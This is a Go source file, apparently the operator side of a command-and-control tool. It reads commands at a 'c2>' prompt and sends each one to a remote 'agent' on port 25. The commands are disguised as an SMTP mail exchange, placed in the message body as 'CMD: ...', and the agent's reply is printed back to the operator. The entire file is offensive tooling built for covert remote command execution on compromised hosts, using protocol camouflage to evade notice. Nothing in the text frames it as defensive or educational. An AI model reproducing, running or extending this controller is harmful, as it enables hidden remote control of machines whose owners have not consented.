package main

import (
    "bufio"
    "fmt"
    "log"
    "net"
    "os"
    "strings"
    "time"
)

func main() {
    if len(os.Args) != 2 {
        fmt.Println("Usage: server <agent_ip>")
        os.Exit(1)
    }
    agent := os.Args[1] + ":25"
    rdStdin := bufio.NewReader(os.Stdin)

    for {
        fmt.Print("c2> ")
        line, err := rdStdin.ReadString('\n')
        if err != nil {
            log.Fatal(err)
        }
        cmd := strings.TrimSpace(line)
        if cmd == "exit" {
            break
        }
        send(agent, cmd)
    }
}

func send(addr, cmdLine string) {
    conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
    if err != nil {
        log.Println("Dial error:", err)
        return
    }
    defer conn.Close()
    rd := bufio.NewReader(conn)
    wr := func(s string) {
        conn.Write([]byte(s + "\r\n"))
    }
    read := func() string {
        l, _ := rd.ReadString('\n')
        return strings.TrimRight(l, "\r\n")
    }

    // SMTP-диалог
    fmt.Println(read())              // 220 ...
    wr("EHLO c2.server");  fmt.Println(read())
    wr("MAIL FROM:<server@c2.local>"); fmt.Println(read())
    wr("RCPT TO:<agent@local.agent>"); fmt.Println(read())
    wr("DATA");             fmt.Println(read()) // 354

    // тело письма
    wr("Subject: CMD")
    wr("")
    wr("CMD: " + cmdLine)
    wr(".")
    
    // читаем многострочный 250-ответ
    for {
        line := read()
        fmt.Println(line)
        // окончание при "250 End"
        if strings.HasPrefix(line, "250 ") {
            break
        }
    }
}
